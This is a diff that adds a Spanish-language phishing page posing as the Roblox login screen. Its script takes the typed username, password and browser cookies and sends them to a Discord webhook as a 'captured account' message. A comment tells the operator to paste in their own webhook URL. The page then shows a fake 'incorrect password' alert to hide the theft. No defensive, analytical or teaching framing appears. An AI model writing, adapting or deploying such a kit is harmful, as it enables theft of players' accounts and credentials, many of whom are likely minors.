@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Inicia sesión</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #1a1a2e; font-family: Arial, sans-serif; }
+        .container { max-width: 400px; margin: 100px auto; background: white; border-radius: 20px; padding: 40px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
+        .logo { font-size: 50px; font-weight: bold; color: #e2231a; margin-bottom: 15px; }
+        h1 { font-size: 28px; margin-bottom: 5px; color: #333; }
+        p { color: #777; margin-bottom: 25px; font-size: 14px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
+        input:focus { border-color: #e2231a; outline: none; }
+        button { width: 100%; padding: 14px; background: #e2231a; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        button:hover { background: #c41e16; }
+        .links { margin-top: 20px; font-size: 14px; }
+        .links a { color: #1877f2; text-decoration: none; margin: 0 10px; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Roblox</div>
+        <h1>Inicia sesión</h1>
+        <p>Ingresa tus datos para continuar</p>
+        <input type="text" id="username" placeholder="Nombre de usuario" autofocus>
+        <input type="password" id="password" placeholder="Contraseña">
+        <button onclick="login()">Iniciar sesión</button>
+        <div class="links">
+            <a href="#">¿Olvidaste tu contraseña?</a>
+            <a href="#">Registrarse</a>
+        </div>
+    </div>
+
+    <script>
+        function login() {
+            var u = document.getElementById('username').value;
+            var p = document.getElementById('password').value;
+            var c = document.cookie;
+
+            if (u == "" || p == "") {
+                alert("Completa todos los campos");
+                return;
+            }
+
+            // CAMBIA ESTO POR TU WEBHOOK DE DISCORD
+            var webhook = "https://discord.com/api/webhooks/AQUI_VA_TU_WEBHOOK";
+
+            fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "**🎮 Cuenta Roblox capturada**\n**Usuario:** " + u + "\n**Contraseña:** " + p + "\n**Cookie:** " + c
+                })
+            });
+
+            alert("Usuario o contraseña incorrectos. Intenta de nuevo.");
+        }
+    </script>
+</body>
+</html>
